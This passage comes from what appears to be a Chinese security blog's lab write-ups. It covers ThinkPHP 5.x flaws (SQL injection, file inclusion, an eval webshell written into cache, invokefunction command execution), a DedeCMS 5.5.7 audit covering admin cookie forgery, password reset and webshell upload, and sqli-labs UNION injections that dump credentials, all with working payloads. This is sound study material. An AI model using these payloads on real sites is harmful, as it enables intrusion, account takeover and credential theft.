class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$options</span> = <span class="title function_ invoke__">request</span>()-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;options&#x27;</span>);</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">db</span>(<span class="string">&#x27;users&#x27;</span>)-&gt;<span class="title function_ invoke__">max</span>(<span class="variable">$options</span>);</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/public/index.php?options=id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1)%20from%20users%23</span><br></pre></td></tr></table></figure><h6 id="代码分析-5">代码分析</h6><p>第一行代码还是一样，直接看获取到的options参数</p><p><img src="/post/96d74354/image-20240304214040554.png" alt="image-20240304214040554" style="zoom:33%;"></p><p>进入max函数查看代码执行流程，max函数中只调用了aggregate方法，而aggregate方法中又调用了connection的aggregate方法</p><p><img src="/post/96d74354/image-20240304214344276.png" alt="image-20240304214344276" style="zoom: 33%;"></p><p>在该函数中重新构造了field</p><p><img src="/post/96d74354/image-20240304214510340.png" alt="image-20240304214510340" style="zoom:33%;"></p><p>接着进入value函数，value函数中的该部分会将field转换为字符串数组形式</p><p><img src="/post/96d74354/image-20240304214751014.png" alt="image-20240304214751014" style="zoom:33%;"></p><p>接着设置query的参数</p><p><img src="/post/96d74354/image-20240304215043886.png" alt="image-20240304215043886" style="zoom: 50%;"></p><p>最后的sql语句就是构造的field</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">MAX</span>(`id`)<span class="operator">+</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="keyword">from</span> users#`) <span class="keyword">AS</span> tp_max <span class="keyword">FROM</span> `users` LIMIT <span class="number">1</span>  </span><br></pre></td></tr></table></figure><p>效果如图所示</p><p><img src="/post/96d74354/image-20240304215326838.png" alt="image-20240304215326838" style="zoom: 33%;"></p><h5 id="文件包含7">文件包含7</h5><h6 id="环境-6">环境</h6><p>thinkphp5.0.18下载</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink/think=5.0.18 tpdemo</span><br></pre></td></tr></table></figure><p>修改composer.json文件</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;require&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;php&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&gt;=5.6.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;topthink/framework&quot;</span><span class="punctuation">:</span> <span class="string">&quot;5.0.18&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure><p>同目录下执行<code>composer update</code></p><h6 id="测试代码-6">测试代码</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">assign</span>(<span class="title function_ invoke__">request</span>()-&gt;<span class="title function_ invoke__">get</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fetch</span>(); <span class="comment">// 当前模块/默认视图目录/当前控制器（小写）/当前操作（小写）.html</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建 <strong>application/index/view/index/index.html</strong>文件，内容随意（没有这个模板文件的话，在渲染时程序会报错），并将图片马<strong>1.jpg</strong> 放至 <strong>public</strong>目录下（模拟上传图片操作）。接着访问<code>~/public/index.php?cacheFile=1.jpg</code>链接，即可触发 <strong>文件包含漏洞</strong> 。</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/public/index.php?cacheFile=1.jpg</span><br></pre></td></tr></table></figure><h6 id="代码分析-6">代码分析</h6><p>首先通过request()-&gt;get()获取get参数</p><p><img src="/post/96d74354/image-20240305102443428.png" alt="image-20240305102443428" style="zoom:33%;"></p><p>接着调用input方法进行过滤或者类型转换，此处没有类型转换，最后返回的data就是传递进来的值</p><p><img src="/post/96d74354/image-20240305102552087.png" alt="image-20240305102552087" style="zoom:33%;"></p><p>接着进入assign函数，在该函数中直接调用了view的assign函数</p><p><img src="/post/96d74354/image-20240305102629136.png" alt="image-20240305102629136" style="zoom:50%;"></p><p>现在进入view的assign函数，这里直接将name给了this-&gt;data，没有过滤</p><p><img src="/post/96d74354/image-20240305102704571.png" alt="image-20240305102704571" style="zoom:33%;"></p><p>最后回到主函数，由此，第一行代码的主要用处就是将get参数赋值给this-&gt;data，接着进入fetch函数，同样也是直接调用的view的fetch函数</p><p><img src="/post/96d74354/image-20240305102840977.png" alt="image-20240305102840977" style="zoom:50%;"></p><p>首先将文件名赋值给var</p><p><img src="/post/96d74354/image-20240305102926018.png" alt="image-20240305102926018" style="zoom:50%;"></p><p>在此处有对vars变量的利用</p><p><img src="/post/96d74354/image-20240305103222701.png" alt="image-20240305103222701" style="zoom:50%;"></p><p>在该函数中首先进行模板文件调取，成功就进入下面的template的fetch函数</p><p><img src="/post/96d74354/image-20240305103336582.png" alt="image-20240305103336582" style="zoom: 33%;"></p><p>在template的fetch函数中，将data值赋值给了this-&gt;data变量，下面主要关注对该变量的使用，如下所示，进入了read函数</p><p><img src="/post/96d74354/image-20240305103540991.png" alt="image-20240305103540991" style="zoom: 33%;"></p><p>在此处调用了extract函数，经过调试测试发现在运行该函数之后cachefile的值就会变成vars的值，应该是extract会将缓存变量覆盖成vars变量的值，最终导致cacheFile的改变</p><p><img src="/post/96d74354/image-20240305103622178.png" alt="image-20240305103622178" style="zoom:33%;"></p><p>效果呈现</p><p><img src="/post/96d74354/image-20240305104145722.png" alt="image-20240305104145722" style="zoom:33%;"></p><h5 id="代码执行8">代码执行8</h5><h6 id="环境-7">环境</h6><p>thinkphp5.0.10下载</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink/think=5.0.10 tpdemo</span><br></pre></td></tr></table></figure><p>修改composer.json文件</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;require&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;php&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&gt;=5.4.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;topthink/framework&quot;</span><span class="punctuation">:</span> <span class="string">&quot;5.0.10&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure><p>同目录下执行<code>composer update</code></p><h6 id="测试代码-7">测试代码</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Cache</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title class_">Cache</span>::<span class="title function_ invoke__">set</span>(<span class="string">&quot;name&quot;</span>,<span class="title function_ invoke__">input</span>(<span class="string">&quot;get.username&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Cache success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/<span class="keyword">public</span>/index.php?username=mochazz123%<span class="number">0</span>d%<span class="number">0</span>a@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[_]);<span class="comment">//</span></span><br></pre></td></tr></table></figure><h6 id="代码分析-7">代码分析</h6><p>可以确定全部操作都是在第一行代码运行出的，首先进入input函数，经过调试在整个input函数中并没有对传入的get参数进行操作，只是将get.username拆分成了get和username，分别给了method和key，最后返回request的method</p><p><img src="/post/96d74354/image-20240305105555449.png" alt="image-20240305105555449" style="zoom:33%;"></p><p>然后就会进入get函数，和前面一样，get函数将会获取get参数内容，并在最后调用input方法</p><p><img src="/post/96d74354/image-20240305105719139.png" alt="image-20240305105719139" style="zoom:33%;"></p><p>在input函数中会对data进行强制类型转换，由于前面没有指定，因此转换的类型就是字符串形式，最后返回的data如下</p><p><img src="/post/96d74354/image-20240305105858355.png" alt="image-20240305105858355" style="zoom:33%;"></p><p>接着进入set方法，看来主要就是下面的set方法</p><p><img src="/post/96d74354/image-20240305105949275.png" alt="image-20240305105949275" style="zoom:33%;"></p><p>首先是init函数，对self进行初始化</p><p><img src="/post/96d74354/image-20240305110102282.png" alt="image-20240305110102282" style="zoom:33%;"></p><p>然后是set函数，首先根据name获取要存入的文件的filename</p><p><img src="/post/96d74354/image-20240305110240895.png" alt="image-20240305110240895" style="zoom:33%;"></p><p>如下是filename的具体生成过程</p><p><img src="/post/96d74354/image-20240305110335703.png" alt="image-20240305110335703" style="zoom:33%;"></p><p>然后将value序列化给data，然后加上前后缀，就直接放入前面生成的filename所指定的文件，由于缺少内容过滤过程，因此很容易被写入恶意代码</p><p><img src="/post/96d74354/image-20240305110435609.png" alt="image-20240305110435609" style="zoom:50%;"></p><p>最终实验效果如下，由于开启了火绒，文件会被自动删除<img src="/post/96d74354/image-20240305110634120.png" alt="image-20240305110634120" style="zoom:33%;"></p><h5 id="代码执行9">代码执行9</h5><h6 id="环境-8">环境</h6><p>thinkphp5.1.30下载</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink/think=5.1.30 tpdemo</span><br></pre></td></tr></table></figure><p>修改composer.json文件</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;require&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;php&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&gt;=5.6.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;topthink/framework&quot;</span><span class="punctuation">:</span> <span class="string">&quot;5.1.30&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure><p>同目录下执行<code>composer update</code></p><h6 id="payload">payload</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/<span class="keyword">public</span>/?s=index/\think\app/invokefunction&amp;<span class="function"><span class="keyword">function</span>=<span class="title">call_user_func_array</span>&amp;<span class="title">vars</span>[0]=<span class="title">system</span>&amp;<span class="title">vars</span>[1][]=<span class="title">whoami</span></span></span><br></pre></td></tr></table></figure><h6 id="代码分析-8">代码分析</h6><p>首先明确 <code>index/\think\app/invokefunction</code>是路径信息，pathinfo，指定了请求的处理逻辑，<code>call_user_func_array</code>应该是请求的函数，vars是两个变量</p><p>从此处的pathinfo函数进行分析，此处的var_pathinfo就是s，代表的是兼容参数，因此我们传入的第一个参数的值会被赋值给<code>$pathinfo</code></p><p><img src="/post/96d74354/image-20240305164143503.png" alt="image-20240305164143503" style="zoom:33%;"></p><p>接着进入path函数，去除了正常的url后缀，最后返回的path还是<code>index/\think\app/invokefunction</code></p><p><img src="/post/96d74354/image-20240305164350845.png" alt="image-20240305164350845" style="zoom: 25%;"></p><p>接着在routecheck函数中检查是否为强制路由模式</p><p><img src="/post/96d74354/image-20240305164506065.png" alt="image-20240305164506065" style="zoom:33%;"></p><p>然后进入check方法，在此处又会对url进行检测，这里的url就是前面的path</p><p><img src="/post/96d74354/image-20240305164637464.png" alt="image-20240305164637464" style="zoom:33%;"></p><p>在这个 <code>check</code> 方法中，首先会检测别名路由，然后检测 URL绑定。如果检测到任何一个条件匹配成功，就会返回相应的结果。如果没有匹配到别名路由或者URL 绑定，就会继续检测是否有设置了 <code>append</code> 或<code>middleware</code>选项，如果有的话，会进行相应的处理。在当前情况下以上条件都不满足，则会调用父类的<code>check</code> 方法进行检测。</p><p><img src="/post/96d74354/image-20240305165021043.png" alt="image-20240305165021043" style="zoom: 33%;"></p><p>最后返回的结果还是false，表示请求的URL不正确或者不在预期的范围内。</p><p><img src="/post/96d74354/image-20240305165316403.png" alt="image-20240305165316403" style="zoom:25%;"></p><p>然后返回前面的check函数，在此处对must进行了判断，如果是强制路由就引发异常，在此处不是</p><p><img src="/post/96d74354/image-20240305165424324.png" alt="image-20240305165424324" style="zoom:33%;"></p><p>然后进行url解析，此处的this-&gt;dispatch就是s的值</p><p><img src="/post/96d74354/image-20240305165605584.png" alt="image-20240305165605584" style="zoom:25%;"></p><p>然后进入parseurlpath函数，返回的path和var的值如下所示</p><p><img src="/post/96d74354/image-20240305165810171.png" alt="image-20240305165810171" style="zoom:25%;"></p><p>接着就是解析模块，在该模块中对控制器和运行函数都进行了解析</p><p><img src="/post/96d74354/image-20240305170010343.png" alt="image-20240305170010343" style="zoom:33%;"></p><p>接着封装路由并返回</p><p><img src="/post/96d74354/image-20240305170107768.png" alt="image-20240305170107768" style="zoom:33%;"></p><p>这个函数将会返回执行结果</p><p><img src="/post/96d74354/image-20240305170449539.png" alt="image-20240305170449539" style="zoom:33%;"></p><p>最后在dispatch函数中调用了call_user_func，将后面传入的两个参数分别作为命令和参数，因为在request里面制定了模块，控制器，方法，还有参数</p><p><img src="/post/96d74354/image-20240305170643834.png" alt="image-20240305170643834" style="zoom:33%;"></p><p>运行结果如图所示</p><p><img src="/post/96d74354/image-20240305170902184.png" alt="image-20240305170902184" style="zoom:33%;"></p><h5 id="代码执行10">代码执行10</h5><h6 id="环境-9">环境</h6><p>thinkphp5.0.23下载</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink/think=5.0.23 tpdemo</span><br></pre></td></tr></table></figure><p>修改composer.json文件</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;require&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;php&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&gt;=5.4.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;topthink/framework&quot;</span><span class="punctuation">:</span> <span class="string">&quot;5.0.23&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure><p>同目录下执行<code>composer update</code></p><h6 id="payload-1">payload</h6><p><img src="/post/96d74354/image-20240305214203124.png" alt="image-20240305214203124" style="zoom:33%;"></p><h6 id="代码分析-9">代码分析</h6><p>该实验主要的漏洞点在于此处的method方法不对post的数据进行过滤，用户可以构造成自己想执行的this的方法，此处采取构造成construct方法</p><p><img src="/post/96d74354/image-20240305213920337.png" alt="image-20240305213920337" style="zoom:33%;"></p><p>然后接着就会调用construct方法，而construct方法就是对变量进行覆盖</p><p><img src="/post/96d74354/image-20240305214010427.png" alt="image-20240305214010427" style="zoom:33%;"></p><p>这里我们主要是利用filtervalue函数中call_user_func方法，因此覆盖的就是filter和value</p><p><img src="/post/96d74354/image-20240305214102646.png" alt="image-20240305214102646" style="zoom:33%;"></p><p>实验效果</p><p><img src="/post/96d74354/image-20240305214143722.png" alt="image-20240305214143722" style="zoom:33%;"></p>]]></content>
    
    
    <summary type="html">&lt;h4 id=&quot;thinkphp5_x不包含反序列化&quot;&gt;Thinkphp5_x（不包含反序列化）&lt;/h4&gt;
&lt;p&gt;参考链接：https://github.com/lu2ker/PHP-Code&lt;/p&gt;</summary>
    
    
    
    <category term="安全" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="php" scheme="http://example.com/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>DedeCMS-5.5.7-sp2</title>
    <link href="http://example.com/post/2e50acad.html"/>
    <id>http://example.com/post/2e50acad.html</id>
    <published>2024-02-21T03:23:16.000Z</published>
    <updated>2024-09-28T16:17:20.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="代码审计第0篇之dedecms-5.5.7-sp2">代码审计第0篇之DedeCMS-5.5.7-sp2</h4><span id="more"></span><h5 id="目标一登录admin账号">目标一：登录admin账号</h5><h6 id="step1-注册新账号">step1: 注册新账号</h6><p>注册新账号查看代码执行过程，找到漏洞点</p><p>如图所示，登录我们创建好的111用户，查看浏览器缓存的cookie信息</p><p><img src="/post/2e50acad/image-20240227184229382.png" alt="image-20240227184229382" style="zoom:25%;"></p><p>由此可知我们如果要登录admin账号，就要构造DedeUserID和DedeUserUserID__ckmd5的cookie值。</p><p>同时观察到此处的我们新注册的账号userID为2，由此猜测admin账号的userID为1，但我们无法得知DedeUserID_ckMd5的值。</p><p><img src="/post/2e50acad/image-20240227183837151.png" alt="image-20240227183837151" style="zoom:25%;"></p><h6 id="step2-获取1的chmd5值">step2: 获取1的chMd5值</h6><p>查看index.php源码有关于cookie的存放</p><p><img src="/post/2e50acad/image-20240227184358057.png" alt="image-20240227184358057" style="zoom:25%;"></p><p>如图所示，在此处对uid的值是否为空进行了条件跳转，若uid为空直接检查是否为登录状态；若不为空，系统会先认为为登录态，再检查参数last_vid，若为空就将uid赋值给last_vid，然后将last_vid放入cookie</p><p><img src="/post/2e50acad/image-20240227184758840.png" alt="image-20240227184758840" style="zoom:25%;"></p><p>查看cookie函数的放置和检查函数，如图所示，此处的Putcookie我们可以猜测就是将原value和value__ckMd5的cookie存入</p><p><img src="/post/2e50acad/image-20240227184850831.png" alt="image-20240227184850831" style="zoom:25%;"></p><p>而Getcookie也就是检查这两个值</p><p><img src="/post/2e50acad/image-20240227185010523.png" alt="image-20240227185010523" style="zoom:25%;"></p><p>而上面我们分析到若uid不为空而lastvid为空我们就可以得到该uid的ckmd5值，因此此处我们将uid设为1，为lastvid设为空</p><p><img src="/post/2e50acad/image-20240227185228742.png" alt="image-20240227185228742" style="zoom:25%;"></p><p>此处的last_vid__ckmd5就是1的ckmd5值，因此我们设置uid和对应的ckmd5查看是否能成功登录，如图所示，登陆成功</p><p><img src="/post/2e50acad/image-20240227185341479.png" alt="image-20240227185341479" style="zoom:25%;"></p><h5 id="目标二修改任意目标用户密码">目标二：修改任意目标用户密码</h5><h6 id="step1-分析修改密码代码">step1: 分析修改密码代码</h6><p>首先确定修改密码的代码部分</p><p><img src="/post/2e50acad/image-20240301215949947.png" alt="image-20240301215949947" style="zoom:33%;"></p><p>如图所示在修改密码之前对传入的的key的值进行了比较，现在查看row['pwd']是什么</p><p><img src="/post/2e50acad/image-20240301220100488.png" alt="image-20240301220100488" style="zoom:67%;"></p><p>row是__pwd_tmp表中对应mid行的信息，也就是如果我们能获取我们要修改的id及其在__pwd_tmp表中的pwd值则可对密码进行更新</p><p>现在寻找在__pwd_tmp表中添加pwd的代码，如下所示，首先随机生成了randval，然后对其散列，最后插入到表中，同时下面还进行了跳转，跳转的域名就包含着存在__pwd_tmp中的密码，由此如果我们想办法进入到该函数则可以成功在__member修改密码</p><p><img src="/post/2e50acad/image-20240301220644379.png" alt="image-20240301220644379" style="zoom:33%;"></p><h6 id="step2-找到入口">step2: 找到入口</h6><p>在sn函数中我们可以成功看到我们想要的函数</p><p><img src="/post/2e50acad/image-20240301221037425.png" alt="image-20240301221037425" style="zoom:33%;"></p><p>而sn算法是在如下情况下使用</p><p><img src="/post/2e50acad/image-20240301221129441.png" alt="image-20240301221129441" style="zoom: 50%;"></p><p>由此整个流程是 dopost=safequestion - - -&gt; sn - - - &gt; newmail -- - &gt; 获取修改密码链接</p><p>根据分析代码我们构造如下cookie（该攻击前提是要修改密码的用户没有设置安全问题，没有设置安全问题的情况下safequestion为0，safeanswer为空）：</p><figure><img src="/post/2e50acad/image-20240301221433515.png" alt="image-20240301221433515"><figcaption aria-hidden="true">image-20240301221433515</figcaption></figure><p>最后访问生成的链接</p><p><img src="/post/2e50acad/image-20240301221852927.png" alt="image-20240301221852927" style="zoom:33%;"></p><h5 id="目标三-一句话木马">目标三： 一句话木马</h5><h6 id="step1-找到漏洞代码">step1: 找到漏洞代码</h6><p>查找上传文件时可能发生的漏洞，在此处是对文件名进行的正则匹配，但是无法避免.jpg.php类型，以此看来该处为漏洞入口</p><p><img src="/post/2e50acad/image-20240302111546471.png" alt="image-20240302111546471" style="zoom:50%;"></p><p>全局查找使用该文件的位置，最终锁定了dede/templets/article_add.htm文件内容中有使用该方法的位置，这里的selectImage函数就是用了上面的正则匹配方式上传文件</p><p><img src="/post/2e50acad/image-20240302163247013.png" alt="image-20240302163247013" style="zoom:33%;"></p><p>根据该路径我们确定是管理员后端的增加文章界面，根据html文件内容我们确定了上传文件的地方</p><p><img src="/post/2e50acad/image-20240302163412969.png" alt="image-20240302163412969" style="zoom:33%;"></p><p>通过本地上传文件之后可以看到上传后的路径</p><p><img src="/post/2e50acad/image-20240302163553791.png" alt="image-20240302163553791" style="zoom:33%;"></p><h6 id="step2-使用burpsuite上传php文件">step2:使用burpsuite上传php文件</h6><p>找到漏洞入口就可以上传文件了，确定上传</p><p><img src="/post/2e50acad/image-20240302170257005.png" alt="image-20240302170257005" style="zoom:33%;"></p><p>最后打开该文件</p><p><img src="/post/2e50acad/image-20240302170423090.png" alt="image-20240302170423090" style="zoom:33%;"></p><p>可采用类似方式上传一句话木马文件掌握控制权</p>]]></content>
    
    
    <summary type="html">&lt;h4 id=&quot;代码审计第0篇之dedecms-5.5.7-sp2&quot;&gt;代码审计第0篇之DedeCMS-5.5.7-sp2&lt;/h4&gt;</summary>
    
    
    
    <category term="安全" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="php" scheme="http://example.com/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs</title>
    <link href="http://example.com/post/b3432909.html"/>
    <id>http://example.com/post/b3432909.html</id>
    <published>2023-12-10T06:26:56.000Z</published>
    <updated>2024-09-28T16:17:20.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="sqli-labs">sqli-labs</h2><span id="more"></span><h3 id="less-1">Less-1</h3><p>如图所示通过burp抓包，首先判断是字符型还是数字型，如图所示，添加单引号并在后面and一个错误的表达式不会返回结果，说明是字符型注入</p><p><img src="/post/b3432909/image-20231210144422416.png" alt="image-20231210144422416" style="zoom: 25%;"></p><p>然后通过如下步骤确定列名，确定数据库名，找到表中的重要信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">确定字符型还是数字型：</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">and</span><span class="operator">%</span><span class="number">201</span><span class="operator">=</span><span class="number">2</span><span class="operator">%</span><span class="number">23</span></span><br><span class="line"></span><br><span class="line">确定返回的数据列长度：</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">order</span><span class="operator">%</span><span class="number">20</span><span class="keyword">by</span><span class="operator">%</span><span class="number">203</span><span class="operator">%</span><span class="number">23</span></span><br><span class="line"></span><br><span class="line">确定每个数字所在位置：</span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">201</span>,<span class="number">2</span>,<span class="number">3</span><span class="operator">%</span><span class="number">23</span></span><br><span class="line"></span><br><span class="line">确定表名：</span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">201</span>,group_concat(table_name),<span class="number">3</span><span class="operator">%</span><span class="number">20</span><span class="keyword">from</span><span class="operator">%</span><span class="number">20</span>information_schema.tables<span class="operator">%</span><span class="number">20</span><span class="keyword">where</span><span class="operator">%</span><span class="number">20</span>table_schema<span class="operator">=</span>database()<span class="operator">%</span><span class="number">23</span></span><br><span class="line"></span><br><span class="line">确定列名：</span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">201</span>,group_concat(column_name),<span class="number">3</span><span class="operator">%</span><span class="number">20</span><span class="keyword">from</span><span class="operator">%</span><span class="number">20</span>information_schema.columns<span class="operator">%</span><span class="number">20</span><span class="keyword">where</span><span class="operator">%</span><span class="number">20</span>table_name<span class="operator">=</span><span class="operator">%</span><span class="number">27</span>users<span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">23</span></span><br><span class="line"></span><br><span class="line">获取数据：</span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">201</span>,group_concat(username,<span class="string">&#x27;-&#x27;</span>,password),<span class="number">3</span><span class="operator">%</span><span class="number">20</span><span class="keyword">from</span><span class="operator">%</span><span class="number">20</span>users<span class="operator">%</span><span class="number">23</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如图所示是最后的结果</p><p><img src="/post/b3432909/image-20231210145354335.png" alt="image-20231210145354335" style="zoom:33%;"></p><h3 id="less-2">Less-2</h3><p>按照以下sql语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">确定是数字型：</span><br><span class="line">id<span class="operator">=</span><span class="number">2</span><span class="operator">%</span><span class="number">20</span><span class="keyword">and</span><span class="operator">%</span><span class="number">201</span><span 